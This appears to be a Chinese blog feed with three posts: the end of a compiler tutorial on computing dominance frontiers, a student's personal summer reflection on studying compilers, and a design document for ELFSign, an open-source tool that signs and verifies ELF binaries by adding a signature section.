<p>可是支配边界的作用是什么呢？我们上面已经解释过了，只有在到达结点 n 的支配边界的时候，才需要考虑其他路径是否有对 n 结点中某值的定义并且插入适当的 Φ-function。</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/6-2020-7-09.png" alt="df1" /></p>

<p>  虽然从结点1的角度来看，它支配结点（例如9，10，11）可能会用到x:3，但并不意味着这些节点里不需要插入ϕ\phiϕ-function的。</p>

<p>  结点 5 定义了值 x := 4，结点 5 没有支配结点并且结点 9 就是结点 5 的支配边界，在这里需要考虑从从其他路径传播到此的对变量 x 的其他定义，也就是结点 1 中的定义 x := 3。所以在结点 9 需要插入一个关于变量 x 的 Φ-function。同理在结点 10 的开头也需要插入一个 Φ-function，另外由于 Φ-function 会产生新的定义，所以也需要在结点 9 的支配边界结点 11 的开头插入 Φ-function。</p>

<p>但是如果要确定支配边界的话，需要先构造出支配者树，然后借助于支配者树来得出支配边界。</p>

<h3 id="0x05-求支配边界">0x05 求支配边界</h3>

<p>这里直接给出算法伪代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="nb">all</span> <span class="n">nodes</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">CFG</span>
    <span class="n">DF</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="o">&lt;-</span> <span class="n">Null</span>

<span class="k">for</span> <span class="nb">all</span> <span class="n">nodes</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">CFG</span>
    <span class="k">if</span> <span class="n">n</span> <span class="n">has</span> <span class="n">multiple</span> <span class="n">predecessors</span> <span class="n">then</span>
        <span class="k">for</span> <span class="n">each</span> <span class="n">predecessor</span> <span class="n">p</span> <span class="n">of</span> <span class="n">n</span>
            <span class="n">runner</span> <span class="o">&lt;-</span> <span class="n">p</span>
            <span class="k">while</span> <span class="n">runner</span> <span class="o">!=</span> <span class="n">IDom</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
                <span class="n">DF</span><span class="p">(</span><span class="n">runner</span><span class="p">)</span> <span class="o">&lt;-</span> <span class="n">DF</span><span class="p">(</span><span class="n">runner</span><span class="p">)</span> <span class="o">+</span> <span class="p">{</span><span class="n">n</span><span class="p">}</span>
                <span class="n">runner</span> <span class="o">&lt;-</span> <span class="n">IDom</span><span class="p">(</span><span class="n">runner</span><span class="p">)</span>
</code></pre></div></div>

<p>  该算法会定位到CFG中的各个汇合点就。接下来，对j的每个前趋p，从p开始沿着支配者树向上走，直到找到一个直接支配j的结点。按照下图举个例子：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/7-2020-7-09.png" alt="df2" /></p>

<ol>
  <li>B1 对于其在CFG中的前趋B0，发现B0是IDom(B1)，因此不进入while循环。对于其前趋B3,此时将B1添加到DF(B3)中，接下来进入B1，将B1添加到DF(B1)中，然后前进到B0，然后停止。</li>
  <li>B3 对于其在CFG中的前趋B2，发现B2不是IDom(B3)，此时将B3添加到DF(B2)中，接下来前进到B1，而B1是IDom(B3)故停止while循环。对于其前趋结点B7，发现B7不是IDom(B3)，此时将B3添加到DF(B7)中，然后前进到B5，将B3添加到DF(B5)中，然后前进到B1停止。</li>
  <li>B7 对于其在CFG中的前趋B6，发现不是IDom(B7)，将B7添加到DF(B6)中，接下来前进到B5，停止while循环。对于其前趋节点B8，将B7添加到DF(B8)，然后前进到B5，然后停止。</li>
</ol>

<p>于是得到支配边界如下：</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>B0</th>
      <th>B1</th>
      <th>B2</th>
      <th>B3</th>
      <th>B4</th>
      <th>B5</th>
      <th>B6</th>
      <th>B7</th>
      <th>B8</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>DF</td>
      <td>Null</td>
      <td>{B1}</td>
      <td>{B3}</td>
      <td>{B1}</td>
      <td>Null</td>
      <td>{B3}</td>
      <td>{B7}</td>
      <td>{B3}</td>
      <td>{B7}</td>
    </tr>
  </tbody>
</table>

<h3 id="0x05-总结">0x05 总结</h3>

<p>  到这里差不多就结束了，这几个算法比较有趣的点在于，数据流分析的大部分算法都是不动点算法，然而为啥能到达不动点属实是一个需要我们思考的问题，事实上如果一个集合只进行并的运算，那么对其进行迭代往往可以达到fixed point，你想一想是不是;)</p>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="compiler" /><summary type="html"><![CDATA[构造Dominator Tree以及Dominator Frontier]]></summary></entry><entry><title type="html">最近干了啥</title><link href="http://localhost:4000/blog/summary" rel="alternate" type="text/html" title="最近干了啥" /><published>2020-06-29T00:00:00+02:00</published><updated>2020-06-29T00:00:00+02:00</updated><id>http://localhost:4000/blog/summary</id><content type="html" xml:base="http://localhost:4000/blog/summary"><![CDATA[<p>  大二下稀里糊涂就在家混过去了，总感觉啥也没干，心里有些过意不去。总的来说技术方面的进步速度十分之缓慢，应该是在家里比较怠堕，主要干了一下事情：</p>

<ul>
  <li>写了ELFSign和Kui这个项目，实际上之花了两周时间，效果还可以</li>
  <li>在长亭打工，主要做了php解密相关工作，破解了市场上常见的php加密，当然比较头铁的商业化加密，比如z5就没能破解，但是津津乐道的zend加密还是搞定了，之后可以总结一下。</li>
  <li>中途学了一阵操作系统，本来打算系统的学一下，被打断了，有点着急，得赶紧开始学了。</li>
  <li>5月份我感觉过得稀里糊涂的，主要在应付学校的课，好烦，估计这学期分挺高的，但是没学到啥东西，心里好难受。</li>
  <li>六月参加编译系统大赛，要写个编译器，我负责平台无关的优化，开始读《编译器设计》这本书。</li>
</ul>

<p>  现在是6月29,前天收到了上交的offer，暑假要去他们的实验室打工了，我主要是想换一个环境，不知道为啥在家总是效率很低，心里还是很愧疚的。比较明显的感受就是，我在学校的时候，看书效率很高，我能看一天都停不下来，现在在家读书20分钟就开始走神，应该还是一个氛围问题。这对我来说是相当要命的，尤其是在我学编译原理的时候，我低估了这部分知识的难度和广度，依然追求快速的学习。显然我失败了，尤其是前面parser的部分，我个人认为甚至应该先跳过去，那些无聊的自动机知识和语法分析的算法真的让我提不起兴趣，我感觉MaxXing说的很对，前端能写递归下降就行了，真正好玩的比如优化，程序分析，代码生成啥的都在后面。</p>

<p>  关于编译原理的学习，我遇到了很大的阻力，有时候一段伪代码我要看好久，而且有些东西我不知道怎么用代码写，比如在代码优化的部分，可以根据分支的频率来设置“落空分支”的位置，就很迷惑这个频率是咋统计的。比如循环展开，看起来挺容易的，但是怎么去判断循环边界。这种细节问题或许我不必纠结，但是不写代码总感觉没学会。不过幸运的是MaxXing给我们讲了一下<a href="https://github.com/MaxXSoft/YuLang">YuLang</a>的具体实现，YuLang后端用的LLVM,所以MaxXing手写了前端和中端，前端我基本能狗出来，但是中端的IR我还没有仔细想怎么具体实现，比如应该用什么结构存储IR（需要存储吗？还是直接生成），这些书上没具体讲，还是得去看代码，或许鲸书里会有讲解？MaxXing给我们讲了一下现代编译器的pass部分，我觉得这种设计真的挺神奇的，豁然开朗。中端的部分主要介绍了一些IR的种类，比如图IR，线性IR，SSA这种。比较有意思的是由IR建立cfg的部分，我恰巧在李樾老师的《软件分析》里学过了，我要是直接读伪代码肯定看不懂，然后在第8章讲变量可达性分析的算法我又时在李樾老师那里学的哈哈哈。这本书中端部分占了很大比重，优化算法基本都是伪代码，我看着有些费劲，但是程序分析的内容讲的倒是挺多的，我接下来要面临的挑战就是实现mem2reg，把现有的IR弄成真正的SSA，然后才能进一步做优化。我上面的一些困惑或许不久之后就会解答，回头来看或许会觉得可笑，因为我学得还太少，估计把后面几章读完能有个更好的理解，希望能学到心里去吧。真心感谢MaxXing学长，改变了我的大学生活轨迹。</p>

<blockquote>
  <p>我去咨询了一下大我一届的学长，发现我校的编译原理只将parser部分…好吧，我已经不打算听课了。</p>
</blockquote>

<p>  之前学习的时候为了贪图知识量，囫囵吞枣般的读了很多书，感觉很多东西都是似懂非懂的。希望接下来看书要细细的去看，看一会儿思考一会儿，多去想想各个知识点之间的联系，可能会扎实一点，比如把编译原理和体系结构联系起来，又会有新的思考;比如其实反汇编器的原理和cpu是一样的。</p>

<p>  如果您读到了这里，不知道您是否和我一样，犯了同样的错误？学习，切勿贪快呀，练得扎实的基础才是王道。</p>

<p>暑期 TODO List：</p>

<ol>
  <li>锻炼，最好能跑步</li>
  <li>看书，宁愿速度慢一点，也要认真弄懂</li>
  <li>整英语，我被自己的拖延症整服了。。。</li>
  <li>操作系统，希望自己能趁暑假学一下，我估计没时间了，因为可能要看编译原理</li>
  <li>切割时间，按计划行事，往往能保护我的娱乐时间，拒绝拖延</li>
</ol>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="solo" /><summary type="html"><![CDATA[鸽了很久总结一哈]]></summary></entry><entry><title type="html">ELFSign 设计文档</title><link href="http://localhost:4000/blog/ELFSign" rel="alternate" type="text/html" title="ELFSign 设计文档" /><published>2020-05-10T00:00:00+02:00</published><updated>2020-05-10T00:00:00+02:00</updated><id>http://localhost:4000/blog/ELFSign</id><content type="html" xml:base="http://localhost:4000/blog/ELFSign"><![CDATA[<h2 id="0x01-项目简介">0x01 项目简介</h2>

<p>  本项目名为<a href="https://github.com/Explainaur/ELFSign">ELFSign</a>，已在Github开源。可对任意ELF 32/64 位文件进行签名并验证。签名后可通过<code class="language-plaintext highlighter-rouge">readelf</code>与<code class="language-plaintext highlighter-rouge">objdump</code>等工具的检测，且不影响正常运行。与本项目配套的另一工程为<a href="https://github.com/Explainaur/Kui">Kui</a>,该项目为Linux Kernel Module，以Hook系统调用<code class="language-plaintext highlighter-rouge">execve</code>的方式，在ELF执行前对其进行签名校验，详细请见相关文档，该项目也已在Github开源，欢迎star。</p>

<h2 id="0x02-功能介绍">0x02 功能介绍</h2>

<p>ELFSign的基本功能有以下3个：</p>

<ol>
  <li>生成公私钥对或X509证书</li>
  <li>对ELF文件进行签名，并在ELF文件中新建一个<code class="language-plaintext highlighter-rouge">.sign</code> section,然后将签名储存到该section中</li>
  <li>对签名后的文件进行校验，若校验通过则可执行</li>
</ol>

<h3 id="安装方式">安装方式</h3>

<p>  该项目依赖<code class="language-plaintext highlighter-rouge">openssl</code>，debian类系统使用记得安装<code class="language-plaintext highlighter-rouge">libssl</code>相关的开发库进行编译。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Explainaur/ELFSign
<span class="nb">mkdir </span>build
<span class="nb">cd </span>build
cmake ..
make <span class="nt">-j8</span>
</code></pre></div></div>

<p>具体的的Usage如下：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USAGE: ./ELFSign <span class="o">[</span>options] file...
Options:
        <span class="nt">-c</span>, <span class="nt">--check</span> Check ELF file and execute it
        <span class="nt">-X</span>, <span class="nt">--check-X509</span> Check ELF file with X509 and execute it
        <span class="nt">-s</span>, <span class="nt">--sign</span> Sign a ELF file
        <span class="nt">-a</span>, <span class="nt">--argument</span> Set arguments of ELF file to execute
        <span class="nt">-g</span>, <span class="nt">--generate</span> Generate public and private key pair
        <span class="nt">-x</span>, <span class="nt">--create-X509</span> Generate X509 certificate
        <span class="nt">-p</span>, <span class="nt">--path</span> Set the path of public/private key
        <span class="nt">-e</span>, <span class="nt">--elf</span> Set the path of ELF file

Example:
         ./ELFSign <span class="nt">--sign</span> <span class="nt">-p</span> ./prikey.pem <span class="nt">-e</span> hello.out
         ./ELFSign <span class="nt">-c</span> <span class="nt">-p</span> ./pubkey.pem <span class="nt">-e</span> hello.out
         ./ELFSign <span class="nt">-X</span> <span class="nt">-p</span> ./ELFSign.pem <span class="nt">-e</span> /usr/bin/cat <span class="nt">-a</span> a.txt
</code></pre></div></div>

<h2 id="0x03-设计原理">0x03 设计原理</h2>

<p>该项目大致可以分为一下几个模块，我会一一详细介绍各个module的原理：</p>

<ol>
  <li>ELF文件解析模块</li>
  <li>ELF文件的读写Section模块</li>
  <li>RSA相关的签名算法模块</li>
</ol>

<h3 id="elf文件解析模块">ELF文件解析模块</h3>
<p>  该模块主要功能为：从指定的ELF文件中加载<strong>所有的Load Segment</strong>.事实上所有对ELF读写相关的核心操作几乎都在对ELF Header与Program Header Table以及Section Header Table的解析上，我们首先来简单介绍一下ELF文件的格式。</p>

<p>ELF文件的宏观结构大概如下图所示：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/object_file_format.png" alt="object_file_format.png" /></p>

<p>  ELF文件有两种视图，一种是链接版，一种是执行版。链接版主要由section构成，运行版则主要有segment构成。那么section和segment的区别是什么？ 实际上segment由section构成，在映射到虚拟内存中后，就是我们常说的data segment，code segment之类的。所以这里我们主要关心section相关的结构。</p>

<p>  首先，我们可以看到，ELF文件由ELF Header，Program Header Table，section，Section Header Table构成。当然链接视图中，program header table是可选的，因为他主要用于告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。下面给一个比较形象的图：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/elf-layout.png" alt="elf-layout.png" /></p>

<p>  可以看到Program Header Table主要和segment有关，section header table则存储了每个section相关的表项。而ELF header则存储了ELF的相关信息，比如代码段入口，section的数目，section header的offset之类的。</p>

<p>  那么第一步，我们需要读取所有的Load Segment，上面我们已经分析了，与segment有关的信息都在Program Header Table这个struct数组里，因此我们首先应该去解析<code class="language-plaintext highlighter-rouge">Elf32_Phdr</code>这个结构体：</p>

<p>  <strong>Program Header Table</strong> 是一个结构体数组，每一个元素的类型是 <code class="language-plaintext highlighter-rouge">Elf32_Phdr</code>，描述了一个段或者其它系统在准备程序执行时所需要的信息。其中，ELF 头中的 <code class="language-plaintext highlighter-rouge">e_phentsize</code> 和 <code class="language-plaintext highlighter-rouge">e_phnum</code> 指定了该数组每个元素的大小以及元素个数。一个目标文件的段包含一个或者多个节。程序的头部只有对于可执行文件和共享目标文件有意义。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="n">Elf32_Word</span>	<span class="n">p_type</span><span class="p">;</span>			<span class="cm">/* Segment type */</span>
  <span class="n">Elf32_Off</span>     <span class="n">p_offset</span><span class="p">;</span>		<span class="cm">/* Segment file offset */</span>
  <span class="n">Elf32_Addr</span>	<span class="n">p_vaddr</span><span class="p">;</span>		<span class="cm">/* Segment virtual address */</span>
  <span class="n">Elf32_Addr</span>	<span class="n">p_paddr</span><span class="p">;</span>		<span class="cm">/* Segment physical address */</span>
  <span class="n">Elf32_Word</span>	<span class="n">p_filesz</span><span class="p">;</span>		<span class="cm">/* Segment size in file */</span>
  <span class="n">Elf32_Word</span>	<span class="n">p_memsz</span><span class="p">;</span>		<span class="cm">/* Segment size in memory */</span>
  <span class="n">Elf32_Word</span>	<span class="n">p_flags</span><span class="p">;</span>		<span class="cm">/* Segment flags */</span>
  <span class="n">Elf32_Word</span>	<span class="n">p_align</span><span class="p">;</span>		<span class="cm">/* Segment alignment */</span>
<span class="p">}</span> <span class="n">Elf32_Phdr</span><span class="p">;</span>
</code></pre></div></div>

<p>每个字段的说明如下:</p>

<table>
  <thead>
    <tr>
      <th>字段</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>p_type</td>
      <td>该字段为段的类型，或者表明了该结构的相关信息。</td>
    </tr>
    <tr>
      <td>p_offset</td>
      <td>该字段给出了从文件开始到该段开头的第一个字节的偏移。</td>
    </tr>
    <tr>
      <td>p_vaddr</td>
      <td>该字段给出了该段第一个字节在内存中的虚拟地址。</td>
    </tr>
    <tr>
      <td>p_paddr</td>
      <td>该字段仅用于物理地址寻址相关的系统中， 由于”System V” 忽略了应用程序的物理寻址，可执行文件和共享目标文件的该项内容并未被限定。</td>
    </tr>
    <tr>
      <td>p_filesz</td>
      <td>该字段给出了文件镜像中该段的大小，可能为 0。</td>
    </tr>
    <tr>
      <td>p_memsz</td>
      <td>该字段给出了内存镜像中该段的大小，可能为 0。</td>
    </tr>
    <tr>
      <td>p_flags</td>
      <td>该字段给出了与段相关的标记。</td>
    </tr>
    <tr>
      <td>p_align</td>
      <td>可加载的程序的段的 p_vaddr 以及 p_offset 的大小必须是 page 的整数倍。该成员给出了段在文件以及内存中的对齐方式。如果该值为 0 或 1 的话，表示不需要对齐。除此之外，p_align 应该是 2 的整数指数次方，并且 p_vaddr 与 p_offset 在模 p_align 的意义下，应该相等。</td>
    </tr>
  </tbody>
</table>

<p>然而我们需要得出这个Segment是不是可以加载的(Loadable)，因此我们需要继续分析<code class="language-plaintext highlighter-rouge">p_type</code>字段，细节如下：</p>

<table>
  <thead>
    <tr>
      <th>名字</th>
      <th>取值</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>PT_NULL</td>
      <td>0</td>
      <td>表明段未使用，其结构中其他成员都是未定义的。</td>
    </tr>
    <tr>
      <td>PT_LOAD</td>
      <td>1</td>
      <td>此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</td>
    </tr>
    <tr>
      <td>PT_DYNAMIC</td>
      <td>2</td>
      <td>此类型段给出动态链接信息。</td>
    </tr>
    <tr>
      <td>PT_INTERP</td>
      <td>3</td>
      <td>此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。</td>
    </tr>
    <tr>
      <td>PT_NOTE</td>
      <td>4</td>
      <td>此类型段给出附加信息的位置和大小。</td>
    </tr>
    <tr>
      <td>PT_SHLIB</td>
      <td>5</td>
      <td>该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合 ABI 标准。</td>
    </tr>
    <tr>
      <td>PT_PHDR</td>
      <td>6</td>
      <td>该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。此外，只有程序头部表是程序的内存映像的一部分时，它才会出现。如果此类型段存在，则必须在所有可加载段项目的前面。</td>
    </tr>
    <tr>
      <td>PT_LOPROC~PT_HIPROC</td>
      <td>0x70000000 ~0x7fffffff</td>
      <td>此范围的类型保留给处理器专用语义。</td>
    </tr>
  </tbody>
</table>

<p>  这里可以看到，当<code class="language-plaintext highlighter-rouge">p_type</code>字段的值为<code class="language-plaintext highlighter-rouge">PT_LOAD</code>时，该segment是可加载的，我们也可以通过<code class="language-plaintext highlighter-rouge">readelf -Wl ./ls</code>这个命令来查看相关的信息，我这里截取ls的相关信息以做演示：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aurora:/home/code/solo/rubbish/ELFsign/build<span class="o">(</span>master⚡<span class="o">)</span> <span class="c"># readelf -Wl ls</span>

Elf 文件类型为 DYN <span class="o">(</span>共享目标文件<span class="o">)</span>
Entry point 0x6130
There are 11 program headers, starting at offset 64

程序头：
  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x000268 0x000268 R   0x8
  INTERP         0x0002a8 0x00000000000002a8 0x00000000000002a8 0x00001c 0x00001c R   0x1
      <span class="o">[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x003438 0x003438 R   0x1000
  LOAD           0x004000 0x0000000000004000 0x0000000000004000 0x012c49 0x012c49 R E 0x1000
  LOAD           0x017000 0x0000000000017000 0x0000000000017000 0x008910 0x008910 R   0x1000
  LOAD           0x020390 0x0000000000021390 0x0000000000021390 0x001258 0x002548 RW  0x1000
  DYNAMIC        0x020dd8 0x0000000000021dd8 0x0000000000021dd8 0x0001f0 0x0001f0 RW  0x8
  NOTE           0x0002c4 0x00000000000002c4 0x00000000000002c4 0x000044 0x000044 R   0x4
  GNU_EH_FRAME   0x01c12c 0x000000000001c12c 0x000000000001c12c 0x0008fc 0x0008fc R   0x4
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
  GNU_RELRO      0x020390 0x0000000000021390 0x0000000000021390 0x000c70 0x000c70 R   0x1
</code></pre></div></div>

<p>  可以看到一共有4个<code class="language-plaintext highlighter-rouge">LOAD SEGMENT</code>，那么接下来我们需要将对应的segment内容读出来即可，这里的方法也很简单：</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">p_offset</code>字段代表该segment的偏移地址，<code class="language-plaintext highlighter-rouge">p_filesz</code>字段代表该segment的大小，可以对照上面的readelf的信息看，即<em>Offset</em>与<em>FileSiz</em>。</li>
  <li>将fd指针设置到<code class="language-plaintext highlighter-rouge">p_offset</code>对应的偏移处，读取<code class="language-plaintext highlighter-rouge">p_filesz</code>大小的内容即可。</li>
</ol>

<p>具体的实现大致如下,我这里读出内容之后直接就做了Hash,代码在<a href="https://github.com/Explainaur/ELFSign/blob/master/src/elf32.c#L245">src/elf32.c</a>：</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">programHeaderTable</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="n">elf32</span><span class="o">-&gt;</span><span class="n">ehdr</span><span class="p">.</span><span class="n">e_phnum</span><span class="p">;</span> <span class="o">++</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">size_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tmp</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Elf32_Phdr</span><span class="p">),</span> <span class="n">fd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Elf32_Phdr</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">err_msg</span><span class="p">(</span><span class="s">"Read Program Header failed"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Judge if Load Segment */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">p_type</span> <span class="o">!=</span> <span class="n">PT_LOAD</span> <span class="o">||</span> <span class="n">tmp</span><span class="p">.</span><span class="n">p_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">continue</span><span class="p">;</span>

	<span class="cm">/* Read Load Segment content */</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">GetLoadSegment32</span><span class="p">(</span><span class="n">elf32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tmp</span><span class="p">);</span>

    <span class="n">SHA1_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">tmp</span><span class="p">.</span><span class="n">p_filesz</span><span class="p">);</span>

	<span class="cm">/* Free content memory */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">content</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">content</span><span class="p">);</span>

    <span class="n">content</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>  到这里我们已经将所有的Load Segment读入并做了Hash。接下来我们就需要进行最重要的一步，完成section的添加和读写模块。</p>

<h3 id="elf文件的读写模块">ELF文件的读写模块</h3>

<p>该模块应当有两个功能：</p>

<ul>
  <li>可读任意section的内容</li>
  <li>可新建一个section用来存放签名</li>
</ul>

<p>关于section的解析，我们主要需要分析 ELF Header 与 Section Header Table。下面我们先来简单介绍一下ELF Header的信息。</p>

<p>ELF Header 描述了 ELF 文件的概要信息，利用这个数据结构可以索引到 ELF 文件的全部信息，数据结构如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define EI_NIDENT   16
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">e_ident</span><span class="p">[</span><span class="n">EI_NIDENT</span><span class="p">];</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_type</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_machine</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">e_version</span><span class="p">;</span>
    <span class="n">ELF32_Addr</span>      <span class="n">e_entry</span><span class="p">;</span>
    <span class="n">ELF32_Off</span>       <span class="n">e_phoff</span><span class="p">;</span>
    <span class="n">ELF32_Off</span>       <span class="n">e_shoff</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">e_flags</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_ehsize</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_phentsize</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_phnum</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_shentsize</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_shnum</span><span class="p">;</span>
    <span class="n">ELF32_Half</span>      <span class="n">e_shstrndx</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Elf32_Ehdr</span><span class="p">;</span>
</code></pre></div></div>

<p>在这里就不深入的介绍每个字段代表的详细意义，只简单介绍一些比较重要的字段。</p>

<ul>
  <li>
    <p>e_shoff<br />
这一项给出节头表在文件中的字节偏移（ Section Header table OFFset ）如果文件中没有节头表，则为 0</p>
  </li>
  <li>
    <p>e_shentsize<br />
这一项给出节头的字节长度（Section Header ENTry SIZE）。一个节头是节头表中的一项；节头表中所有项占据的空间大小相同。</p>
  </li>
  <li>
    <p>e_shnum<br />
这一项给出节头表中的项数（Section Header NUMber）。因此， e_shnum 与 e_shentsize 的乘积即为节头表的字节长度。如果文件中没有节头表，则该项值为 0。</p>
  </li>
  <li>
    <p>e_shstrndx<br />
这一项给出节头表中与节名字符串表相关的表项的索引值（Section Header table InDeX related with section name STRing table）。如果文件中没有节名字符串表，则该项值为SHN_UNDEF。</p>
  </li>
</ul>

<p>  我们的目标是向ELF中插入一个section，那么首先要清楚ELF是怎么存储并识别section的，按照开发者的思路，我们很容易想到我们可以把每个section的信息和特征抽象成一个struct，然后把所有的struct存入一个数组，最后把数组的地址放入ELF Header就可以了。这样我们就可以直接通过ELF Header来获得section struct数组，进而间接获得section的信息。其实上面这几个字段的作用便是如此。存储struct的数组就是上面提到的Section Header Table，在ELF文件的末尾。</p>

<p>  <code class="language-plaintext highlighter-rouge">.shstrtab</code>是一个字符串section，他存储了所有section的名字，ELF Header中的<code class="language-plaintext highlighter-rouge">e_shstrndx</code>便是其在Section Header Table中的索引，因此想要获得<code class="language-plaintext highlighter-rouge">.shstrtab</code>的真是偏移我们只需要按如下公式计算:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shstrtabOff</span> <span class="o">=</span> <span class="n">e_shoff</span> <span class="o">+</span> <span class="n">e_shstrndx</span> <span class="o">*</span> <span class="n">e_shentsize</span>    <span class="c1">// 基址 + 索引 × 大小</span>
</code></pre></div></div>

<p>  那如何获得section name在.shstrtab中的具体偏移？其实section struct的真是名字叫Elf32_Shdr(32位),结构如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_name</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_type</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_flags</span><span class="p">;</span>
    <span class="n">ELF32_Addr</span>      <span class="n">sh_addr</span><span class="p">;</span>
    <span class="n">ELF32_Off</span>       <span class="n">sh_offset</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_size</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_link</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_info</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_addralign</span><span class="p">;</span>
    <span class="n">ELF32_Word</span>      <span class="n">sh_entsize</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Elf32_Shdr</span><span class="p">;</span>
</code></pre></div></div>

<p>这个结构提存储了每个section的详细信息，第一个字段sh_name是section name在.shstrtab中的偏移。</p>

<p>那么我们究竟要怎样才能插入一个section呢？步骤大致如下：</p>

<ol>
  <li>向Section Header Table中插入new section Header，即插入一个新的结构体</li>
  <li>向 <code class="language-plaintext highlighter-rouge">.shstrtab</code> section中插入new section的section name</li>
  <li>修改.shstrtab的sh_size</li>
  <li>修改ELF Header中的e_shnum字段</li>
  <li>向目标位置写入section内容</li>
</ol>

